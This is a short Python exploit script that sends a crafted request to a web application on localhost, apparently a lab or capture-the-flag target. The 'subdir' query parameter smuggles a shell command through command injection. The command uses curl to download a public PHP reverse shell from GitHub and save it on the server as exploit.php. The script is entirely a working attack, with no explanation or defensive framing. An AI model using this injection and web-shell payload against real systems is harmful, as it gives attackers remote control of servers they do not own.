import requests

URL = "http://127.0.0.1:83/public/?subdir=public;%20curl%20https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php%20%3E%20exploit.php;"

r = requests.get(url = URL)

